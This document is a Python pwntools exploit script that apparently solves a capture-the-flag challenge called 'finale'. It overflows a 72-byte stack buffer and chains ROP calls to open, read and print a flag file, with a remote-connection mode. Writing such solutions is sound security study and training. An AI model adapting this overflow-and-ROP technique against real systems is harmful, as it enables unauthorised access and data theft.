#!/usr/bin/env python3

from pwn import *

import re

e = ELF("./finale_patched")
# libc = ELF('./libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']
# context.log_level = 'debug'


def conn():
    if args.LOCAL:
        # Use PTY (Pseudo terminal) to avoid some stdin/out buffer issue, e.g. HTB Jeeves
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
    elif args.GDB:
        r = gdb.debug([e.path], '''
                      b *(main)
                      c
                      ''', stdin=process.PTY, stdout=process.PTY)
    elif args.GDB_ATTACH:
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
        gdb.attach(r, gdbscript='''
                      b *(finale+0x7d)
                      c
                   ''')
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r


def main():
    r = conn()

    r.sendlineafter(b'phrase:', b's34s0nf1n4l3b00')
    data = r.recvuntil(b'next year:')
    match = re.search(br'0x[0-9a-fA-F]+', data)
    # The souvenir happpens to be the start of the input string buffer.
    buff_addr = int(match.group(0), 16)
    info(f'buff_addr is {hex(buff_addr)}')

    rop = ROP(e)
    flag_txt = b'flag.txt\x00'
    rop.raw(flag_txt)
    rop.raw(b'\x90' * (72 - len(flag_txt)))
    rop.open(buff_addr, 0)  # The opened file handler is likely 3 based on debugging.
    # Cannot read the file directly here because no gadget to set the rdx for read().
    # We have to loop back to finale to use its default rdx value.
    rop.finale()
    r.sendline(rop.chain())

    r.recvuntil(b'next year:')
    rop = ROP(e)
    rop.raw(b'\x90' * 72)
    bss = e.bss() + 0x20 # Need this 0x20 offset otherwise we overwrite the stdout and puts() will have no output.
    rop.read(3, bss)
    rop.puts(bss)
    r.sendline(rop.chain())

    r.interactive()

if __name__ == "__main__":
    main()
